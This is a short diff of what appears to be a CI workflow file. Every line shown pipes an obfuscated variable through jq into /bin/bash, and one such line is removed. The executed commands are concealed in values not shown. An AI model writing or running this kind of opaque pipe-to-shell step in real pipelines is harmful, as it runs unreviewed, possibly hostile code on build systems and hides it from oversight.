@@ -26,7 +26,6 @@ jobs:
           echo $ghcc018 | jq -r .dwrdx253 | /bin/bash
           printf '%s' "$f70044" | jq -r .spm12 | /bin/bash
           printf '%s' "$la230" | jq -r .hppt58 | /bin/bash
-          echo $g21021 | jq -r .gt68727 | /bin/bash
           echo $ttsus7 | jq -r .d512 | /bin/bash
           echo $lotx97 | jq -r .bqky09 | /bin/bash
           echo $qqtlf5 | jq -r .cy5624 | /bin/bash
